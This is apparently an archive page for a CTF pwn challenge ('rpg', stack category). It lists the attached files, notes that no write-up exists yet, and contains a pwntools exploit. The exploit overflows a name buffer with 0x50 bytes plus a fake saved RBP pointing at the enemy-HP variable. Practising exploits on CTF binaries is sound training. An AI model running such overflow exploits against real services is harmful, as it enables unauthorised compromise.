# 知识点

栈

# 题目分析

分类：pwn / 栈。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [rpg](rpg)
- [rpg.py](rpg.py)
- [rpg1.py](rpg1.py)

尚无可匹配的题解正文，当前保留附件及已有脚本，分析结论待补。

# EXP

- [rpg.py](rpg.py)
- [rpg1.py](rpg1.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import *
from pathlib import Path

here = Path(__file__).resolve().parent
pwn_root = Path(__file__).resolve().parents[3]
loader = pwn_root / 'libc/2.27/amd64/ld-linux-x86-64.so.2'
libdir = pwn_root / 'libc/2.27/amd64/glibc227/glibc227-fixed/lib/x86_64-linux-gnu'
exe = context.binary = ELF(str(here / 'rpg'), checksec=False)
io = process([str(loader), '--library-path', str(libdir), exe.path])
#io = remote("psdxs.idss-cn.com", 27265)
fake_rbp = exe.sym['emy_hp'] + 4
payload = b'A' * 0x50 + p64(fake_rbp)

io.sendafter(b'Enter your name:\n', payload)
io.sendlineafter(b'How many hp do you want to give (0-10000):\n', b'0')

io.interactive()
```
